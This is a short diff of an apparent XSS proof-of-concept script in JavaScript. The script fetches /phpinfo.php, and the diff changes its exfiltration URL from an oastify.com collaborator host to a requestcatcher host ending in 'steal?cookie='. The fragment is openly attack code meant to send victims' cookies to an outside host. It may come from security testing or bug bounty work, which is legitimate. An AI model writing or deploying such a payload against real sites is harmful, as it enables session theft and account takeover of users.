@@ -1,6 +1,6 @@
 (async () => {
   const target = "/phpinfo.php";
-  const exfil = "https://iugzvjhvkeratw5rgxfn6fo4avgm4js8.oastify.com/steal?cookie=";
+  const exfil = "https://secuna.requestcatcher.com/steal?cookie=";
 
   try {
     console.log("[XSS] Fetching phpinfo from", target);
